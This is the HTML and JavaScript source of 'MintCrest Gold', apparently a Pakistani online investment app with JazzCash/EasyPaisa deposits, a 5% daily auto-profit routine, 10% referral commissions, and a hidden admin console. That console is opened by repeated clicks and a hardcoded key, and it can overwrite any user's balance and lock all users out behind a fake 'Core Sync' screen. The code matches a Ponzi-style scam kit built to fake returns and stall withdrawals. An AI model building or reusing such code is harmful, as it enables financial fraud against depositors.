<!DOCTYPE html>
<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>MintCrest Gold | Final Integrated Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --blue: #2f81f7; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); border-radius: 24px; transition: 0.3s; }
        .page { display: none; animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
        input, select { background: #161b22; border: 1px solid var(--border); color: white; padding: 16px; border-radius: 14px; width: 100%; outline: none; margin-bottom: 12px; font-size: 14px; }
        input:focus { border-color: var(--blue); box-shadow: 0 0 0 2px rgba(47, 129, 247, 0.2); }
        .btn-prime { background: linear-gradient(135deg, #2f81f7, #1e40af); color: white; font-weight: 800; border-radius: 16px; cursor: pointer; border: none; padding: 18px; width: 100%; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 10px 20px rgba(30, 64, 175, 0.3); }
        #toast { visibility: hidden; min-width: 280px; background: #2f81f7; color: #fff; text-align: center; border-radius: 12px; padding: 18px; position: fixed; z-index: 20000; left: 50%; transform: translateX(-50%); bottom: 110px; font-size: 12px; font-weight: 800; }
        #toast.show { visibility: visible; animation: fadeInOut 3s; }
        @keyframes fadeInOut { 0%, 100% { opacity: 0; bottom: 80px; } 15%, 85% { opacity: 1; bottom: 110px; } }
        .nav-icon { opacity: 0.3; transition: 0.4s; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .nav-icon.active { opacity: 1; color: #2f81f7; transform: translateY(-8px); }
        .status-badge { padding: 4px 10px; border-radius: 8px; font-size: 9px; font-weight: 900; text-transform: uppercase; }
    </style>
</head>
<body onclick="secretBypass()">

    <div id="toast">SYSTEM INITIALIZED</div>

    <div id="lock-screen" class="fixed inset-0 z-[1000000] bg-[#010409] hidden flex flex-col items-center justify-center p-10 text-center">
        <div class="w-20 h-20 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-10"></div>
        <h1 class="text-3xl font-black text-blue-500 mb-4 uppercase tracking-[5px]">Core Sync</h1>
        <p class="text-[11px] font-bold opacity-50 uppercase tracking-[2px] max-w-xs">Optimizing server nodes for better returns sweetie! 😘</p>
    </div>

    <header class="p-6 flex justify-between items-center bg-[#010409]/95 backdrop-blur-xl border-b border-white/5 sticky top-0 z-[5000]">
        <div class="flex items-center gap-4">
            <div onclick="adminOpen()" class="w-12 h-12 bg-blue-600 rounded-2xl flex items-center justify-center text-white font-black text-2xl shadow-2xl cursor-pointer active:scale-90 transition">M</div>
            <div>
                <h1 class="text-[15px] font-black uppercase tracking-tighter">MINTCREST <span class="text-blue-500">GOLD</span></h1>
                <p id="node-id" class="text-[9px] font-bold opacity-40 uppercase text-blue-400">Verifying Security...</p>
            </div>
        </div>
        <div id="header-bal" class="bg-blue-600/10 px-5 py-2.5 rounded-2xl border border-blue-500/20 text-blue-500 text-[13px] font-black italic">PKR 0.00</div>
    </header>

    <main id="main-content" class="hidden p-6 space-y-8 pb-36">
        
        <div id="p-home" class="page active-page space-y-8">
            <div class="glass p-10 bg-gradient-to-br from-blue-900 via-[#0d1117] to-[#010409] border-blue-500/20 relative overflow-hidden">
                <div class="absolute -right-20 -top-20 w-48 h-48 bg-blue-500/10 rounded-full blur-[80px]"></div>
                <p class="text-[11px] font-bold opacity-50 uppercase tracking-[3px]">Net Equity</p>
                <h2 class="text-6xl font-black tracking-tighter mt-3" id="main-bal">PKR 0</h2>
                <div class="mt-12 flex gap-4">
                    <button onclick="changePage('deposit')" class="flex-1 py-5 bg-blue-500 text-white rounded-2xl font-black text-[12px] uppercase shadow-2xl active:scale-95 transition">Add Asset</button>
                    <button onclick="changePage('withdraw')" class="flex-1 py-5 bg-white/5 border border-white/10 rounded-2xl font-black text-[12px] uppercase active:scale-95 transition">Withdraw</button>
                </div>
            </div>
            
            <h3 class="text-xs font-black opacity-30 uppercase tracking-[4px] pl-2">Investment Nodes</h3>
            <div id="plans-render" class="space-y-4"></div>
        </div>

        <div id="p-team" class="page space-y-8">
            <div class="glass p-8 text-center border-l-4 border-blue-500">
                <p class="text-[10px] font-bold opacity-40 uppercase mb-4 tracking-[2px]">Your Asset Link (10% Commission)</p>
                <div class="flex items-center gap-4 bg-white/5 p-5 rounded-2xl border border-white/10">
                    <p id="ref-copy" class="text-[12px] font-bold text-blue-500 break-all flex-1 text-left">---</p>
                    <button onclick="copyRefLink()" class="text-blue-500 text-2xl active:scale-90 transition"><i class="fa-solid fa-copy"></i></button>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-6">
                <div class="glass p-7 text-center shadow-xl"><h4 id="team-size" class="text-4xl font-black">0</h4><p class="text-[10px] opacity-40 uppercase font-bold mt-2">Team Nodes</p></div>
                <div class="glass p-7 text-center shadow-xl"><h4 id="team-earning" class="text-4xl font-black text-green-500">PKR 0</h4><p class="text-[10px] opacity-40 uppercase font-bold mt-2">Net Bonus</p></div>
            </div>
        </div>

        <div id="p-deposit" class="page space-y-8">
            <div id="bank-list" class="space-y-4"></div>
            <div class="glass p-8 space-y-6">
                <input type="number" id="dep-val" placeholder="Amount (e.g. 1000)">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)">
                <div class="text-center">
                    <p class="text-[10px] font-black opacity-30 uppercase mb-3">Upload Transfer Receipt</p>
                    <input type="file" id="dep-proof" class="text-[11px] border-2 border-dashed border-white/10 py-8 text-center cursor-pointer">
                </div>
                <button onclick="processDeposit()" class="btn-prime">Authenticate Transfer</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-8">
            <div class="glass p-8 space-y-6">
                <input type="number" id="wd-val" placeholder="Min Withdrawal: 500">
                <input type="text" id="wd-acc" placeholder="Wallet/Account Number">
                <input type="text" id="wd-name" placeholder="Account Holder Name">
                <select id="wd-method">
                    <option value="EasyPaisa">EasyPaisa</option>
                    <option value="JazzCash">JazzCash</option>
                </select>
                <button onclick="processWithdraw()" class="w-full py-5 bg-red-600/10 text-red-500 border border-red-500/20 rounded-2xl font-black text-[12px] uppercase active:scale-95 transition">Request Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-ui" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-8 pb-40">
        <div class="flex justify-between items-center mb-12 border-b border-white/5 pb-6">
            <h2 class="text-2xl font-black text-blue-500 uppercase italic tracking-tighter">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-white/10 px-8 py-3 rounded-2xl text-[11px] font-black">EXIT</button>
        </div>

        <button onclick="systemLock()" id="lock-btn" class="w-full py-5 mb-8 rounded-2xl font-black text-[12px] uppercase">Lock System: --</button>
        
        <div id="request-list" class="space-y-6"></div>

        <div class="glass p-8 mt-12 border-l-4 border-purple-600">
            <h4 class="text-[12px] font-black uppercase text-purple-500 mb-6">Database Balance Force</h4>
            <input id="adm-u-name" placeholder="User Name (Exact)">
            <input id="adm-u-bal" type="number" placeholder="Set Absolute Balance">
            <button onclick="adminForceBalance()" class="w-full py-5 bg-purple-600 rounded-2xl font-black text-[12px] uppercase shadow-lg">Overwrite Data</button>
        </div>
    </div>

    <a href="https://wa.me/923705519562" class="fixed bottom-32 right-6 bg-[#25d366] text-white w-14 h-14 rounded-full flex items-center justify-center text-3xl shadow-2xl z-[4500] active:scale-90 transition"><i class="fa-brands fa-whatsapp"></i></a>

    <nav id="bottom-nav" class="hidden fixed bottom-0 w-full glass bg-[#0d1117]/98 border-t border-white/5 p-8 flex justify-around items-center z-[5000] rounded-t-[45px] shadow-[0_-20px_50px_rgba(0,0,0,0.5)]">
        <div onclick="changePage('home')" class="nav-icon active" id="nav-home"><i class="fa-solid fa-layer-group text-2xl"></i><span class="text-[9px] font-black uppercase">Nodes</span></div>
        <div onclick="changePage('team')" class="nav-icon" id="nav-team"><i class="fa-solid fa-users-viewfinder text-2xl"></i><span class="text-[9px] font-black uppercase">Team</span></div>
        <div onclick="changePage('deposit')" class="nav-icon" id="nav-deposit"><i class="fa-solid fa-circle-plus text-2xl"></i><span class="text-[9px] font-black uppercase">Add</span></div>
        <div onclick="changePage('withdraw')" class="nav-icon" id="nav-withdraw"><i class="fa-solid fa-money-bill-transfer text-2xl"></i><span class="text-[9px] font-black uppercase">Get</span></div>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let clickCountA = 0; let clickCountB = 0; let mStatus = false;

        // --- ADMIN / SECRET LOGIC ---
        function adminOpen() { clickCountA++; if(clickCountA >= 5) { if(prompt("God Key:")==="mint786") { document.getElementById('admin-ui').classList.remove('hidden'); syncAdmin(); } clickCountA=0; } }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        function secretBypass() {
            if(!document.getElementById('lock-screen').classList.contains('hidden')) {
                clickCountB++; if(clickCountB >= 5) { if(prompt("Master Key:")==="mint786") { document.getElementById('lock-screen').classList.add('hidden'); document.getElementById('admin-ui').classList.remove('hidden'); syncAdmin(); } clickCountB=0; }
            }
        }

        async function syncAdmin() {
            db.collection("requests").where("status","==","pending").onSnapshot(s => {
                const list = document.getElementById('request-list'); list.innerHTML = '';
                s.forEach(doc => {
                    const r = doc.data();
                    list.innerHTML += `<div class="glass p-7 border-l-4 border-blue-500 text-[11px] font-bold uppercase">
                        <p class="mb-3 text-blue-400 font-black">${r.type} Req | ${r.user}</p>
                        <p class="mb-5">Amount: PKR ${r.amount.toLocaleString()}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full rounded-2xl mb-6 shadow-2xl">` : ''}
                        <div class="flex gap-4">
                            <button onclick="approveTransaction('${doc.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 py-4 bg-green-600 rounded-xl shadow-lg">Approve</button>
                            <button onclick="db.collection('requests').doc('${doc.id}').update({status:'rejected'})" class="flex-1 py-4 bg-red-600/20 text-red-500 rounded-xl">Reject</button>
                        </div>
                    </div>`;
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                mStatus = d.data()?.maintenance;
                const b = document.getElementById('lock-btn');
                b.innerText = "System Lock: " + (mStatus?"ACTIVE":"OFF");
                b.className = mStatus ? "w-full py-5 mb-8 bg-red-600/10 text-red-500 border border-red-500/20 rounded-2xl font-black text-[12px] uppercase" : "w-full py-5 mb-8 bg-green-600/10 text-green-500 border border-green-500/20 rounded-2xl font-black text-[12px] uppercase";
            });
        }

        async function approveTransaction(id, u, a, type) {
            if(type === 'Deposit') {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(a), active: true });
                const snap = await db.collection("users").doc(u).get();
                if(snap.data().refBy && snap.data().refBy !== 'Direct') {
                    await db.collection("users").doc(snap.data().refBy).update({ balance: firebase.firestore.FieldValue.increment(a * 0.10) });
                }
            } else {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(-a) });
            }
            await db.collection("requests").doc(id).update({ status: 'approved' });
            toast("TRANSACTION COMPLETED");
        }

        async function adminForceBalance() {
            const u = document.getElementById('adm-u-name').value;
            const b = Number(document.getElementById('adm-u-bal').value);
            await db.collection("users").doc(u).update({ balance: b });
            toast("DB SYNCED");
        }

        async function systemLock() { await db.collection("settings").doc("system").set({ maintenance: !mStatus }); }

        // --- AUTO-PROFIT ENGINE (5% DAILY) ---
        async function runAutoYield(id, data) {
            const now = Date.now();
            const last = data.lastYield || 0;
            const dayInMs = 86400000;
            if (data.active && (now - last) >= dayInMs) {
                const profit = Math.floor(data.balance * 0.05);
                if (profit > 0) {
                    await db.collection("users").doc(id).update({ balance: firebase.firestore.FieldValue.increment(profit), lastYield: now });
                    toast(`+PKR ${profit} PROFIT CREDITED! 😘`);
                }
            }
        }

        // --- USER CORE ---
        function syncUser(id) {
            db.collection("users").doc(id).onSnapshot(async d => {
                user = d.data(); if(!user) return;
                await runAutoYield(id, user);
                const b = (user.balance || 0).toLocaleString();
                document.getElementById('main-bal').innerText = "PKR " + b;
                document.getElementById('header-bal').innerText = "PKR " + b;
                document.getElementById('ref-copy').innerText = window.location.origin + "/?ref=" + id;
                db.collection("users").where("refBy","==",id).onSnapshot(s => {
                    document.getElementById('team-size').innerText = s.size;
                    let earn = 0; s.forEach(doc => earn += (doc.data().balance * 0.1));
                    document.getElementById('team-earning').innerText = "PKR " + Math.floor(earn).toLocaleString();
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                if(d.data()?.maintenance && id !== 'admin') document.getElementById('lock-screen').classList.remove('hidden');
                else document.getElementById('lock-screen').classList.add('hidden');
            });
            db.collection("plans").orderBy("price","asc").onSnapshot(s => {
                const r = document.getElementById('plans-render'); r.innerHTML = '';
                s.forEach(doc => {
                    const p = doc.data();
                    r.innerHTML += `<div class="glass p-8 border-l-4 border-blue-500 flex justify-between items-center transition active:scale-95">
                        <div><p class="text-[10px] opacity-30 uppercase font-black tracking-widest">${p.name}</p><h4 class="text-3xl font-black">PKR ${p.price.toLocaleString()}</h4><p class="text-[11px] text-green-500 font-bold mt-2">Daily Return: PKR ${p.dailyProfit}</p></div>
                        <button onclick="changePage('deposit')" class="bg-blue-600 px-8 py-4 rounded-2xl font-black text-[11px] shadow-lg shadow-blue-500/20">ACTIVATE</button>
                    </div>`;
                });
            });
            db.collection("settings").doc("gateways").onSnapshot(d => {
                const g = d.data();
                document.getElementById('bank-list').innerHTML = `
                    <div class="p-6 glass flex justify-between text-[13px] font-black border-l-4 border-yellow-500"><span>JazzCash Node</span><span>${g.jazz}</span></div>
                    <div class="p-6 glass flex justify-between text-[13px] font-black border-l-4 border-green-500"><span>EasyPaisa Node</span><span>${g.easy}</span></div>`;
            });
        }

        async function processDeposit() {
            const a = Number(document.getElementById('dep-val').value); const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof').files[0];
            if(!a || !t || !f) return alert("Fill all proof details sweetie!");
            const reader = new FileReader(); reader.readAsDataURL(f);
            reader.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: reader.result, type: 'Deposit', status: 'pending', time: Date.now() });
                toast("VERIFICATION IN PROGRESS"); changePage('home');
            };
        }

        async function processWithdraw() {
            const a = Number(document.getElementById('wd-val').value); const acc = document.getElementById('wd-acc').value; const n = document.getElementById('wd-name').value;
            if(a < 500 || !acc || !n) return alert("Min 500 & full data required.");
            if(a > user.balance) return alert("Insufficient Balance.");
            await db.collection("requests").add({ user: user.name, amount: a, account: acc, title: n, method: document.getElementById('wd-method').value, type: 'Withdraw', status: 'pending', time: Date.now() });
            toast("PAYOUT REQUEST SENT"); changePage('home');
        }

        function toast(m) { const t = document.getElementById("toast"); t.innerText = m; t.className = "show"; setTimeout(()=>t.className="", 3000); }
        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('.nav-icon').forEach(i=>i.classList.remove('active')); document.getElementById('nav-'+p).classList.add('active');
        }
        function copyRefLink() { navigator.clipboard.writeText(document.getElementById('ref-copy').innerText); toast("LINK COPIED!"); }
        
        window.onload = () => { 
            const session = localStorage.getItem('mc_session');
            if(session) {
                document.getElementById('node-id').innerText = "NODE: " + session.toUpperCase();
                document.getElementById('main-content').classList.remove('hidden');
                document.getElementById('bottom-nav').classList.remove('hidden');
                syncUser(session);
            }
        }
    </script>
</body>
</html>
